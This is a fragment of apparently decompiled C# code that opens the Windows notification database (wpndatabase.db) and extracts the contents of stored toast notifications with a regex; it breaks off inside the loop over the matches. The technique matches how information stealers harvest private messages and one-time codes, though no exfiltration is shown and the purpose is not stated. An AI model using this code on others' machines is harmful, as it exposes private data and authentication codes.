				}
				string path = Path.Combine(folderPath, "Microsoft\\Windows\\Notifications");
				string path2 = Path.Combine(path, "wpndatabase.db");
				if (File.Exists(path2))
				{
					try
					{
						byte[] array;
						using (FileStream fileStream = new FileStream(path2, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
						{
							using (MemoryStream memoryStream = new MemoryStream())
							{
								fileStream.CopyTo(memoryStream);
								array = memoryStream.ToArray();
							}
						}
						if (array.Length > 0)
						{
							string input = Encoding.UTF8.GetString(array);
							MatchCollection matchCollection = Regex.Matches(input, "<toast[^>]*>(.*?)</toast>", RegexOptions.Singleline);
							int count = matchCollection.Count;
							int num = 0;
							foreach (Match item in matchCollection)
							{
								string value = item.Value;
